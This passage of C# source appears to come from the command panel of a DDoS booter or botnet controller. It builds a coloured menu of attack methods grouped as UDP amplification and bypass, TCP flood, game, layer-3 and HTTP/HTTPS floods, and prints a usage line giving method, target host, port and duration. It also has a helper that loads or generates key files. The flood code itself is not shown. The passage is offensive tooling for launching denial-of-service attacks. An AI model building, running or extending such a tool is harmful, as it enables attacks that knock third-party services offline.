            AppendCategory("LAYER 4 UDP (AMPLIFICATION & BYPASS)", "\x1b[1;95m", l4Udp);
            AppendCategory("LAYER 4 TCP (FLOOD & BYPASS)", "\x1b[1;94m", l4Tcp);
            AppendCategory("LAYER 4 GAME (SPECIALIZED UDP / TCP)", "\x1b[1;93m", l4Game);
            AppendCategory("LAYER 3 (NETWORK PROTOCOLS)", "\x1b[1;91m", l3);
            AppendCategory("LAYER 7 (HTTP / HTTPS / APPLICATION)", "\x1b[1;92m", l7);

            var others = _methods.Where(m => !l4Udp.Contains(m.Name) && !l4Tcp.Contains(m.Name) &&
                                             !l4Game.Contains(m.Name) && !l3.Contains(m.Name) &&
                                             !l7.Contains(m.Name)).ToList();
            if (others.Count > 0)
            {
                var otherSet = new HashSet<string>(others.Select(o => o.Name), StringComparer.OrdinalIgnoreCase);
                AppendCategory("CUSTOM / OTHER METHODS", "\x1b[1;96m", otherSet);
            }

            sb.AppendLine();
            sb.AppendLine("  \x1b[90mUsage  :\x1b[0m \x1b[93m<method> <host/ip/url> <port> <time>\x1b[0m");
            sb.AppendLine("  \x1b[90mExample:\x1b[0m \x1b[38;5;45m.https https://example.com 443 60\x1b[0m");
            sb.AppendLine();

            return sb.ToString().Replace("\n", "\r\n").Replace("\r\r\n", "\r\n");
        }

        private static string GetOrGenerateKey(string fileName, Func<string> generateKey)
        {
            string path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, fileName);
            if (File.Exists(path))
            {
                return File.ReadAllText(path);
            }

            if (File.Exists(fileName))
            {
                return File.ReadAllText(fileName);
            }

            string newKey = generateKey();
            try
            {
                File.WriteAllText(path, newKey);
            }
            catch
            {
                File.WriteAllText(fileName, newKey);
            }
            return newKey;
        }
    }
}
